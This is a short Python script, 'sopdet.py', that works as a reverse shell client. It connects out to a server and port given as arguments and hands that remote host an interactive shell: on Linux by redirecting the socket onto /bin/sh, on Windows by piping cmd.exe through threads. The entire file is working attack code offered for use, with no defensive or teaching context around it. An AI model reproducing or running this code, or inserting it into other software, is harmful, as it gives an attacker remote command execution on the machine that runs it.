#!/usr/bin/python

import os, socket, subprocess, threading, sys;

# Errors & Messages
def help():
    print("[!] Usage: sopdet.py <server> <port> <linux/windows>")

def successful():
    print("[*] Sopdet client connected to %s" % server)

def unsuccessful():
    print("[!] Unable to connect to port %s on remote server!" % port)

# Unrecognised command
if len(sys.argv[1:]) != 3:
    help()
    sys.exit(0)

# Defines remote host details as variables
server= str(sys.argv[1]); port=int(sys.argv[2]);system=str(sys.argv[3])
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

# Checks to see if port on remote host is open.
# If you ever need to see what error is in the output, add 'z' into the 
# sys.exit line above. 'z' is defined as the error output variable.
try:
    s.connect((server,port))
except Exception as erroroutput:
    z = erroroutput
    unsuccessful()    
    sys.exit()    

# Linux shell
def linux():
   successful()
   os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
   p=subprocess.call(["/bin/sh", "-i"])

# Windows shell
def win():
   successful()
   p=subprocess.Popen(["\\windows\\system32\\cmd.exe"], stdout=subprocess.PIPE, 
   	                   stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
   s2p_thread = threading.Thread(target=s2p, args=[s, p])
   s2p_thread.daemon = True
   s2p_thread.start()
   p2s_thread = threading.Thread(target=p2s, args=[s, p])
   p2s_thread.daemon = True
   p2s_thread.start()
   p.wait()

# General
def s2p(s, p):
    while True:
        data = s.recv(1024)
        if len(data) > 0:
            p.stdin.write(data)

# OS verification
def p2s(s, p):
    while True:
        s.send(p.stdout.read(1))
try:
	if system == "windows":
	       win()
	elif system == "linux":
               linux()

except KeyboardInterrupt:
    s.close()
